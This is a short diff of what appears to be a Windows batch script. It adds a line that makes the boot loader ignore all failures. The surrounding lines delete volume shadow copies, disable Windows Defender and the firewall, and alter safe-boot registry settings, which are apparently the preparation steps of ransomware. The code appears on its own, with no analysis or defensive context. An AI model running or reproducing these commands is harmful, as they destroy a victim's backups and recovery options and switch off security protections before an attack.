@@ -76,6 +76,7 @@ wmic shadowcopy delete >nul 2>&1
 bcdedit /deletevalue {current} safeboot >nul 2>&1
 sc config WinDefend start= disabled >nul 2>&1
 netsh firewall set opmode disable >nul
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
 netsh advfirewall set allprofiles state off >nul 2>&1
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "OptionValue" /t REG_DWORD /d 1 /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /v "OptionValue" /t REG_DWORD /d 1 /f
